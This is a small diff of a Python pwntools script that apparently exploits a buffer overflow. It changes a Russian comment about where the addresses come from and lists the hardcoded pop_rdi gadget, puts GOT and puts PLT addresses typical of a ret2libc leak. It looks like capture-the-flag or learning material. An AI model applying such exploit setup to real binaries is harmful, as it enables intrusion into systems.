@@ -1,6 +1,6 @@
 from pwn import *
 
-# берется из info function для первого BOF
+# адреса pop_rdi и puts@, берутся из info function для первого BOF
 pop_rdi = 0x40114a
 puts_got = 0x404000
 puts_plt = 0x401030
